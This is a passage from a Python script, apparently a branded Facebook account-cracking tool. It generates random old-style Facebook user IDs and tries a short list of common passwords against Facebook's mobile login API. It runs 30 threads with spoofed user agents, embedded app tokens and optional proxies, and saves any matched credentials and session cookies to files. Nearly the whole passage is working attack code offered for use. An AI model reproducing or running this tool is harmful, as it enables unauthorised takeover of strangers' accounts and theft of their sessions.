    windows_versions = ['10.0', '6.3', '6.1']
    chrome_major = random.randint(90, 115)
    chrome_build = random.randint(4000, 5100)
    chrome_patch = random.randint(30, 150)
    chrome_minor = random.randint(0, 5)
    letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    rand_letter1 = random.choice(letters)
    rand_letter2 = random.choice(letters)
    rand_number = random.randint(1, 999)
    user_agent = f'Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; Win64; x64){rand_letter1}{rand_number}{rand_letter2} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/537.36'
    return user_agent

def fuck_xnxx():
    rr = random.randint
    aZ = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    url6 = f'Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'
    return url6

def fuck_xnxxxx():
    mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F'])
    url1 = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return url1

def fuck_xx():
    url3 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
    return url3

def ua():
    aa = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    return aa

def fuck_xnxxxxx():
    realmi = random.choice(['RMP2107', 'RMX3770', 'RMX2176', 'RMX3939', 'RMX3868'])
    url4 = '[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/' + realmi + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    return url4

def ua2():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    return f'Mozilla/5.0 (Windows NT {rr(9, 11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99, 149)}.0.{rr(4500, 4999)}.{rr(35, 99)} Chrome/{rr(99, 175)}.0.{rr(0, 5)}.{rr(0, 5)} Safari/537.36'

def ua():
    rr = random.randint
    aZ = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA = random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx = random.randrange(1, 999)
    xx = f'Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'
    return xx

for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['M2012K11AG Build/'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Oppo A38)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/97.0.4740.200 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 8.1.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['CPH1909 Build/O11019 )'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)

def __OLDUA__():
    win_major = random.choice([10, 11])
    chrome_major = random.choice(range(120, 123))
    chrome_build = random.choice(range(0, 6000))
    chrome_patch = random.choice(range(0, 200))
    safari_version = 537
    ua = f"Mozilla/5.0 (Windows NT {win_major}.0; Win64; x64) "f"AppleWebKit/{safari_version}.36 (KHTML, like Gecko) "f"Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/{safari_version}.36"
    return ua

def sm():
    Anderson = random.choice([
        '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', 
        '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
    model = random.choice([
        'GT-I9505', 'SM-T835', 'SM-S901U', 'MMB29K', 'SM-S134DL', 'SM-J250F', 
        'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 
        'SM-J410G', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005'])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice([
        'com.facebook.adsmanager|MobileAdsManagerAndroid', 
        'com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android', 
        'com.facebook.mlite|MessengerLite'])
    FBAN = fb.split('|')[1]
    platform = fb.split('|')[0]
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) '
          f'[FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};'
          f'FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density={str(random.choice(range(1, 4)))}.0,width={str(random.choice(range(720, 1500)))}'
          f',height={str(random.choice(range(1500, 2000)))};FB_FW/1;]')
    return ua

def ug1():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.0.0; moto e5 plus Build/OPPS27.91-179-8-16) '
          f'[FBAN/FB4A;FBAV/{fb_v1}.0.0.50.{fb_v2};FBPN/com.facebook.katana;FBLC/es_MX;FBBV/{rdp1};'
          f'FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/{andv}.0.0;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=1.7,width=720,height=1358}};FB_FW/1;FBRV/0;]')
    return ua

def ug2():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.1.1; vivo V3Max Build/LMY47V) '
          f'[FBAN/Orca-Android;FBAV/{fb_v1}.0.0.16.{fb_v2};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{rdp1};'
          f'FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andv}.1.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=3.0,width=1080,height=1920}}')
    return ua
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
logo = f"""\x1b[1;92m
  d88888b d8888b. d8888b.  .d88b.  d8888b. 
  88'     88  `8D 88  `8D .8P  Y8. 88  `8D 
  88ooooo 88oobY' 88oobY' 88    88 88oobY' 
  88~~~~~ 88`8b   88`8b   88    88 88`8b   
  88.     88 `88. 88 `88. `8b  d8' 88 `88. 
  Y88888P 88   YD 88   YD  `Y88P'  88   YD \x1b[1;92mE\x1b[1;93mT\x1b[1;94mH\x1b[1;95mA\x1b[1;96mN
\x1b[1;97m════════════════════════════════════════════════
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m AUTHOR   : ERROR
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m FACEBOOK : ETHAN KLEIN HUILEN
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m GITHUB   : ERRORDEATH-403
\x1b[1;97m════════════════════════════════════════════════
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m FEATURE  : OLD CLONING
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m VERSION  : 1.1
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m STATUS   : \x1b[1;91m[\x1b[1;92mFREE 5 DAYS\x1b[1;91m]
\x1b[1;97m════════════════════════════════════════════════"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def menu():
    clear()
    print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m OLD CLONING M1')
    print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m OLD CLONING M2')
    print(' \x1b[1;91m[\x1b[1;92m0\x1b[1;91m] \x1b[1;97m EXIT')
    linex()
    error=input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
    if error in ['1', '01']:
        cracker = ERRORCracker()
        cracker.old_menu()
    elif error in ['2', '02']:
        _old_()
    elif error in ['0', '00']:
        exit(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXIT DONE')
    else:
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m OPTION NOT FOUND IN MENU');time.sleep(3);menu()
        time.sleep(3)
        menu()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#                        
class ERRORCracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.user_agents = self.load_user_agents()
    def load_user_agents(self):
        try:
           # response = requests.get('https://raw.githubusercontent.com/ERRORDEATH-403/CONTROL-ROOM/refs/heads/main/ua.txt')
           # return response.text.splitlines()
            return [user_agent_generator.generate_user_agent() for _ in range(100)]
        except Exception:
            return []
    def old_menu(self):
        clear()
        print(f' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m START CRACK 2009 ACCOUNTS\n \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m START CRACK 2009-2013 ACCOUNTS');linex()
        choice=input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
        if choice in ['1', '01']:
            self.execute_breach('100000')
        elif choice in ['2', '02']:
            self.quantum_breach_menu()
        else:
            time.sleep(2)
            self.old_menu()            
    def quantum_breach_menu(self):
        clear()
        series_map = {'1': ' 100000', '2': ' 100001', '3': ' 100002', '4': ' 100003', '5': ' 100004', '6': ' 100005', '7': ' 100006', '8': ' 100007', '9': ' 100008', '10': '100009', '11': '1000010', '12': '1000011', '13': '1000012', '14': '1000013', '15': '1000014', '16': '1000015'}
        for num, prefix in series_map.items():
            print(f' \x1b[1;91m[\x1b[1;92m{num}\x1b[1;91m] \x1b[1;97m {prefix}')
        linex()
        choice=input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
        selected_prefix=series_map.get(choice)
        if not selected_prefix:
            time.sleep(2)
            self.quantum_breach_menu()
            return
        self.execute_breach(selected_prefix)
    def execute_breach(self, prefix):
        try:
            clear()
            print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXAMPLE  : 1000/2000/3000/4000/5000/9999 ');linex()
            limit = int(input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LIMIT : '))
        except ValueError:
            time.sleep(2)
            self.old_menu()
            return
        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890']
        with tred(max_workers=30) as executor:
            clear()
            print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;93m TOTAL ID \x1b[1;97m: \x1b[1;92m{len(targets)} \x1b[1;97m> \x1b[1;91mM1')
            print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m IF NO RESULT \x1b[1;91m[\x1b[1;92mON\x1b[1;91m/\x1b[1;92mOFF\x1b[1;91m] \x1b[1;97mAIRPLANE MODE')
            linex()
            for target in targets:
                executor.submit(self.breach_target, target, passlist)
        self.display_results()
    def breach_target(self, target, passlist):
        self.loop += 1
        color = random.choice([P,M,H,K,B,U,O,N])
        sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M1\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{self.loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(self.oks)}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;91mCP-:{len(self.cps)}\x1b[1;97m]");sys.stdout.flush()
        sys.stdout.flush()
        for password in passlist:
            if self.try_breach(target, password):
                return
    def try_breach(self, uid, password):
        try:
            #ua = random.choice(self.user_agents)
            ua = Samsung()
            #ua = __OLDUA__()
            #ua = windows()
            ua = generate_user_agent()
            headers = {
                'User-Agent': ua,
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
                'X-FB-Connection-Quality': 'EXCELLENT',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-session-id': f"nid={''.join(random.choices(ascii_letters, k=8))};pid=Main",
                'x-fb-device-group': '5120',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': str(uuid.uuid4()),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com'
            }
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'register_api',
                'email': uid,
                'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': 'NO_FILE',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_PK',
                'client_country_code': 'PK',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_analytics_tags': '["GDPR","GLOBAL"]',
                'fb_api_platform': 'ANDROID',
                'fb_api_session_id': str(uuid.uuid4()),
                'fb_api_client_time': str(int(time.time())),
                'device_country': 'pk',
                'logging_id': ''.join(random.choices('0123456789abcdef', k=32)),
                'jazoest': '2' + str(random.randint(10, 99)),
                'machine_id': ''.join(random.choices('0123456789abcdefghijklmnopqrstuvwxyz', k=24))
            }
            encoded_payload = urllib.parse.urlencode(payload)
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/auth/login')
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 10)
            header_list = [f"{key}: {value}" for key, value in headers.items()]
            c.setopt(c.HTTPHEADER, header_list)
            c.perform()
            response_body = buffer.getvalue().decode('utf-8')
            response = json.loads(response_body)
            c.close()
            buffer.close()
            if 'session_key' in response:
                self.handle_success(uid, password, response)
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.handle_partial(uid, password)
                return True
        except Exception as e:
            pass
        except requests.exceptions.ConnectionError:
            pass
        return False
    def handle_success(self, uid, password, response):
        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
        print(f'\r\r\x1b[1;97m[\x1b[1;92mERROR-OK💚\x1b[1;97m]\x1b[1;92m '+uid+f' | '+password+'')
        open('/sdcard/ERROR-ZONE/ERROR-OLD-M1-COOKIE.txt', 'a').write(uid+'|'+password+'|'+coki+"\n")
        self.oks.append(uid)
    def handle_partial(self, uid, password):
        print(f'\r\r\x1b[1;97m[\x1b[1;92mERROR-OK💚\x1b[1;97m]\x1b[1;92m '+uid+f' | '+password+'')
        open('/sdcard/ERROR-ZONE/ERROR-OLD-M1-OK.txt','a').write(uid+'|'+password+'\n')
        self.oks.append(uid)
    def display_results(self):
        print()
        linex()
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
        linex()
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK/CP : '+str(len(self.oks))+'/'+str(len(self.cps)))
        linex()
        input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
        menu()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#                        
def _old_():
    clear()
    print(f' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m START 2009-2010 CLONE\n \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m START 2011-2012 CLONE\n \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m START 2007-2008 CLONE');linex()
    select=input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
    if select in ['1', '01']:
        old_2009_2010()
    elif select in ['2', '02']:
        old_2011_2012()
    elif select in ['3', '03']:
        old_2007_2008()
    else:
        time.sleep(2)
        _old_()

def old_2009_2010():
    user = []
    clear()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXAMPLE  : 1000/2000/3000/4000/5000/9999 ');linex()
    limit=int(input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LIMIT : '))
    year_code = '10000'
    clone_system = '2009-2010'
    clear()
    print(f' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m METHOD M1\n \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m METHOD M2\n \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m METHOD M3');linex()
    method=input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
    clear()
    ask = input(" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m USE PROXY? [Y/N]: ").lower()
    if ask == 'y':
       use_proxy = True
       load_proxies()
       print(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LOADED {len(proxies)} PROXIES.")
       time.sleep(3)
    else:
       use_proxy = False
    for i in range(limit):
        data=str(random.choice(range(1000000000,1999999999)))
        user.append(data)
    with tred(max_workers=30) as ERROR:
        clear()
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;93m TOTAL ID \x1b[1;97m: \x1b[1;92m{len(user)} \x1b[1;97m> \x1b[1;91mM{method}')
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m IF NO RESULT \x1b[1;91m[\x1b[1;92mON\x1b[1;91m/\x1b[1;92mOFF\x1b[1;91m] \x1b[1;97mAIRPLANE MODE')
        linex()
        for mal in user:
            uid=year_code+mal
            passlist = ["123456","1234567","12345678","123456789","123123","143143","1234567890"]
            if method in ['1','01']:
                ERROR.submit(_method_A_,uid,passlist,user)
            elif method in ['2','02']:
                ERROR.submit(_method_B_,uid,passlist,user)
            elif method in ['3','03']:
                ERROR.submit(_method_C_,uid,passlist,user)
    print()
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    menu()

def old_2011_2012():
    user = []
    clear()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXAMPLE  : 1000/2000/3000/4000/5000/9999 ');linex()
    limit=int(input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LIMIT : '))
    year_code = '10000'
    clone_system = '2011-2012'
    clear()
    print(f' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m METHOD M1\n \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m METHOD M2\n \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m METHOD M3');linex()
    method=input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
    clear()
    ask = input(" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m USE PROXY? [Y/N]: ").lower()
    if ask == 'y':
       use_proxy = True
       load_proxies()
       print(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LOADED {len(proxies)} PROXIES.")
       time.sleep(3)
    else:
       use_proxy = False
    for i in range(limit):
        data=str(random.choice(range(1000000000,1999999999)))
        user.append(data)
    with tred(max_workers=30) as ERROR:
        clear()
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;93m TOTAL ID \x1b[1;97m: \x1b[1;92m{len(user)} \x1b[1;97m> \x1b[1;91mM{method}')
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m IF NO RESULT \x1b[1;91m[\x1b[1;92mON\x1b[1;91m/\x1b[1;92mOFF\x1b[1;91m] \x1b[1;97mAIRPLANE MODE')
        linex()
        for mal in user:
            uid=year_code+mal
            passlist = ["123456","1234567","12345678","123456789","123123","143143","1234567890"]
            if method in ['1','01']:
                ERROR.submit(_method_A_,uid,passlist,user)
            elif method in ['2','02']:
                ERROR.submit(_method_B_,uid,passlist,user)
            elif method in ['3','03']:
                ERROR.submit(_method_C_,uid,passlist,user)
    print()
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
    menu()

def old_2007_2008():
    user = []
    clear()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXAMPLE  : 1000/2000/3000/4000/5000/9999 ');linex()
    limit=int(input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LIMIT : '))
    year_code = '10000'
    clone_system = '2007-2008'
    clear()
    print(f' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m METHOD M1\n \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m METHOD M2\n \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m METHOD M3');linex()
    method=input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
    plist = []
    clear()
    ask = input(" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m USE PROXY? [Y/N]: ").lower()
    if ask == 'y':
       use_proxy = True
       load_proxies()
       print(f" \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LOADED {len(proxies)} PROXIES.")
       time.sleep(3)
    else:
       use_proxy = False
    for i in range(limit):
        data=str(random.choice(range(1000000000,1999999999)))
        user.append(data)
    with tred(max_workers=30) as ERROR:
        clear()
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;93m TOTAL ID \x1b[1;97m: \x1b[1;92m{len(user)} \x1b[1;97m> \x1b[1;91mM{method}')
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m IF NO RESULT \x1b[1;91m[\x1b[1;92mON\x1b[1;91m/\x1b[1;92mOFF\x1b[1;91m] \x1b[1;97mAIRPLANE MODE')
        linex()
        for mal in user:
            uid=year_code+mal
            passlist = ["123456","1234567","12345678","123456789","123123","143143","1234567890"]
            if method in ['1','01']:
                ERROR.submit(_method_A_,uid,passlist,user)
            elif method in ['2','02']:
                ERROR.submit(_method_B_,uid,passlist,user)
            elif method in ['3','03']:
                ERROR.submit(_method_C_,uid,passlist,user)
    print()
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
